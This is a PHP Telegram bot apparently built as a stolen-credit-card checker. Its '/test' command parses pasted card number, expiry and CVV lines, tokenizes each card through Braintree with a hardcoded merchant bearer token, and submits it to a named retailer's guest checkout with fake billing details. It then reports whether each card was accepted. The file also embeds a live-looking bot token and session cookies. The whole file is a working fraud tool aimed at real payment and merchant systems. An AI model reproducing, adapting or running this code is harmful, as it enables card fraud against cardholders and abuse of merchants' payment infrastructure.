<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');


$botToken = "689347298:AAEcpBcIifMqdT0dmFBm2Jo6xI8LiiJvHOU";
$botUrl = "https://api.telegram.org/bot".$botToken;

$update = file_get_contents("php://input");
$data = json_decode($update, TRUE);

$chatId = $data["message"]["chat"]["id"];
$message = $data["message"]["text"];

switch($message){
	case "/start":
		sendMessage($chatId, "Maligayang pagdating sa aking bot. Ito ay para sa mga jolly batibot.");
		break;
	case strpos($message, "/test") !== false:
		$string = str_ireplace("/test", "", $message);
		
		if(preg_match('/[^0-9\n|\-]/', $string) !== false){
			$filtered_string = preg_replace('/[^0-9\n|\-]/', '', $string);

			for ($i=0; $i <= substr_count($filtered_string, "\n"); $i++) { 
				$cclist = explode("\n", $filtered_string); 
				$entry = explode("|", $cclist[$i]);
				
				$cc = $entry[0];
				$mes = $entry[1];
				$ano = $entry[2];
				$cvv = $entry[3];
				$email = "doublebrown".rand(1, 200000)."@gmail.com";
				$postal = rand(0000, 9999);

				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch, CURLOPT_COOKIEFILE, $GLOBALS["botUrl"].'/cookie.txt');
				curl_setopt($ch, CURLOPT_COOKIEJAR, $GLOBALS["botUrl"].'/cookie.txt');
				    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
				'Accept:*/*',
				'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2MDg3OTY3OTUsImp0aSI6IjdmOGMzMDk2LTI3ZWUtNDI1MS04NzYwLTQ3NzlhOTg3MmRiZSIsInN1YiI6InRoaHZ6YmpzMm1nbnJ6ZHoiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InRoaHZ6YmpzMm1nbnJ6ZHoiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6Imdsb3J5dGVjaGxsY19pbnN0YW50In19.IFhQplOdUpCQ6e7Ue8W5nTB25n6O9VteTya2RpTVA8uTZ7ig_HDupSf7jRuJQ-VD2ba89BZhZZV0N5yofpUlfA',
				'braintree-version: 2018-05-10',
				'content-type: application/json',
				'origin: https://assets.braintreegateway.com',
				'referer: https://assets.braintreegateway.com/'
				));
				curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"3ecb2e70-8094-4ac8-b58e-248cae6c2dbd"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
				$pagamento = curl_exec($ch);

				$data_response = json_decode($pagamento, true);
				$tok = $data_response['data']['tokenizeCreditCard']['token'];
				
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'https://www.eyewearcanada.com/rest/default/V1/guest-carts/I2fFsUohXw9mcFTsNdubxsrI7sAv6KPc/payment-information');
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
				curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
				    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
				'accept: */*',
				'content-type: application/json',
				'cookie: PHPSESSID: e1ea73c449311d1199c035d4473220f7; _nx-nocache=1; mage-translation-storage=%7B%7D; mage-translation-file-version=%7B%7D; schultzoptical-_zldp=e22hps4H1gQlJGseSAvXqRE52iEPEiGbvZN6Ecm5cuaFuSE23gJ1PN312DmgojYMmKwM1K1ctjo%3D; schultzoptical-_zldt=c80613a8-00a3-4f86-a83d-a88446974e2c-2; form_key=mcJdl0ghIawM0STT; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; _ga=GA1.2.1195936622.1608710391; _gid=GA1.2.1856218864.1608710391; instantsearch=%7B%7D; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; private_content_version=5a8dd74423222e02f5dd5411f4617c2c; mage-messages=; section_data_ids=%7B%22cart%22%3A1608710395%2C%22wishlist%22%3A1608710395%2C%22customer%22%3A1608710395%2C%22compare-products%22%3A1608710395%2C%22captcha%22%3A1608710395%2C%22product_data_storage%22%3A1608710395%2C%22last-ordered-items%22%3A1608710395%2C%22directory-data%22%3A1608710395%2C%22instant-purchase%22%3A1608710395%2C%22persistent%22%3A1608710395%2C%22review%22%3A1608710395%2C%22guest_wishlist%22%3A1608710395%2C%22recently_viewed_product%22%3A1608710395%2C%22recently_compared_product%22%3A1608710395%2C%22paypal-billing-agreement%22%3A1608710395%2C%22checkout-fields%22%3A1608710395%2C%22collection-point-result%22%3A1608710395%2C%22pickup-location-result%22%3A1608710395%7D',
				'origin: https://www.eyewearcanada.com',
				'referer: https://www.eyewearcanada.com/checkout/'
				));
				curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"I2fFsUohXw9mcFTsNdubxsrI7sAv6KPc","billingAddress":{"countryId":"CA","regionId":"66","regionCode":"AB","region":"Alberta","street":["3698  th Street"],"company":"","telephone":"6787898999","postcode":"'.$postal.'","city":"Calgary","firstname":"isaac","lastname":"werry","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$tok.'"}},"email":"'.$email.'"}');
				$pagamento = curl_exec($ch); 
				$error_message = GetStr($pagamento, '"message":"','"');


				sendMessage($chatId, $error_message);
			}
		}
		else{
			sendMessage($chatId, "Hindi ma-test ang mensahe.");
		}
		
		break;
	default:
		sendMessage($chatId, "Hindi kita maunawaan.");
}

function sendMessage($chatId, $message){
	$url = $GLOBALS["botUrl"]."/sendMessage?chat_id=" .$chatId. "&text=" .urlencode($message);
	file_get_contents($url);
}

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

?>
